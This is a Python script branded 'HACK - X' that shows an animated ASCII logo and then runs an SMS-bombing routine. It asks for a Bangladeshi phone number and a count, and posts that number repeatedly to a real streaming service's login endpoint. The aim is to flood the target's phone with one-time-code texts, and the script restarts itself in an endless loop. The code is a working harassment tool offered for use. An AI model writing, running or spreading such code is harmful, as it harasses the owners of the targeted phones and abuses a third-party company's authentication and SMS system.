# -*- coding: utf-8 -*-
from __future__ import print_function
import os, sys, time, math
import requests

# ---------------- SOUND PLAY (Termux-friendly) -----------------
def play_sound():
    try:
        os.system("termux-media-player play access.wav")
    except:
        pass

# ---------------- LOGO & ANIMATION -----------------
TITLE = "HACK - X"
FPS = 0.04

LOGO = [
"██╗  ██╗ █████╗  ██████╗██╗  ██╗     ██╗  ██╗",
"██║  ██║██╔══██╗██╔════╝██║  ██║     ██║ ██╔╝",
"███████║███████║██║     ███████║     █████╔╝ ",
"██╔══██║██╔══██║██║     ██╔══██║     ██╔═██╗ ",
"██║  ██║██║  ██║╚██████╗██║  ██║     ██║  ██╗",
"╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝     ╚═╝  ╚═╝",
"",
"888    888  88888b.     .d8888b   888    888",
"888    888  888 \"88b   d88P  Y88b 888    888",
"888    888  888  888   888    888 888    888",
"8888888888  888  888   888        8888888888",
"888    888  888  888   888  88888 888    888",
"888    888  888  888   888    888 888    888",
"888    888  888  88P   Y88b  d88P 888    888",
"888    888  888888P     \"Y8888P88 888    888",
"",
"                 ╔═╗╔═╗╔═╗╦╔═   ╔═╗╔╗ ╦",
"                 ╠═╣║ ║║ ║╠╩╗   ║ ║╠╩╗║",
"                 ╩ ╩╚═╝╚═╝╩ ╩   ╚═╝╚═╝╩",
"                   ★★★  HACK - X  ★★★"
]

RESET = "\033[0m"
RED = "\033[31m"
YELLOW = "\033[33m"
MAG = "\033[35m"
BOLD = "\033[1m"
BG_Y = "\033[43m"
BG_R = "\033[41m"

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def term():
    try:
        import shutil
        s = shutil.get_terminal_size()
        return s.columns, s.lines
    except:
        return 80, 25

def center(lines, width):
    out = []
    for ln in lines:
        pad = max(0,(width-len(ln))//2)
        out.append(" " * pad + ln)
    return out

def flame(line, t, r):
    out = ""
    for i,ch in enumerate(line):
        if ch.strip()=="":
            out+=ch
            continue
        flick = math.sin(i*0.12 + t*4 + r*0.3)
        if flick>0.7:
            out += BG_Y + RED + ch + RESET
        elif flick>0.3:
            out += RED + ch + RESET
        else:
            out += ch
    return out

def wave(lines, t):
    out=[]
    for r,ln in enumerate(lines):
        shift = int(2*math.sin(t*2 + r*0.5))
        if shift>0:
            out.append(" "*shift + ln)
        else:
            out.append(ln)
    return out

def glow_title(t):
    phase=int((math.sin(t*3)+1)*2)
    if phase==0: col = BG_R + BOLD
    elif phase==1: col = BG_Y + BOLD
    else: col = MAG + BOLD
    return " " * 10 + col + "   " + TITLE + "   " + RESET

def shake(lines,t):
    sh=int(math.sin(t*10)*2)
    out=[]
    for ln in lines:
        if sh>0:
            out.append(" "*sh+ln)
        else:
            out.append(ln)
    return out

def frame(t):
    cols,rows = term()
    block=[]
    for r,ln in enumerate(LOGO):
        hue = math.sin(t + r*0.2)
        if hue>0.5: col = RED + BOLD
        elif hue>0: col = YELLOW + BOLD
        else: col = MAG + BOLD
        line = col + ln + RESET
        line = flame(line,t,r)
        block.append(line)

    block = wave(block,t)
    block = shake(block,t)
    block.append(glow_title(t))
    block = center(block,cols)
    return "\n".join(block)

# ----------------- STATIC LOGO -----------------
def print_static_logo():
    clear()
    cols, _ = term()
    logo_lines = center(LOGO, cols)
    for ln in logo_lines:
        print(RED + BOLD + ln + RESET)
    print("\n")

# ------------------- SMS SCRIPT -------------------
def run_sms_script():
    print_static_logo()
    api="https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en"
    n = str(input('\033[1;34mEnter your number : \033[0m'))
    a = int(input('\033[1;32mEnter the amount : \033[0m'))
    number={"number":"+88"+n}

    for i in range(a):
        requests.post(api,data=number)
        print('\033[1;31m'+str(i+1)+' Sms Sent 👿😈☠️🥷\033[0m')

# ------------------- MAIN -------------------
def main():
    # লোগো অ্যানিমেশন
    t=0
    stop_time = time.time() + 4  # অ্যানিমেশন ৪ সেকেন্ড
    while True:
        clear()
        if time.time() > stop_time:
            break
        print(frame(t))
        sys.stdout.flush()
        time.sleep(FPS)
        t+=0.15

    # লোগো শেষে অডিও প্লে
    play_sound()

    # SMS স্ক্রিপ্ট শুরু
    run_sms_script()

# ------------------- AUTO RESTART -------------------
def restart():
    time.sleep(1)
    os.execv(sys.executable, ['python'] + sys.argv)

if __name__ == "__main__":
    while True:
        try:
            main()
        except Exception as e:
            print("Error:", e)
        print("\n[+] Program Finished… Restarting Automatically...\n")
        time.sleep(1)
        restart()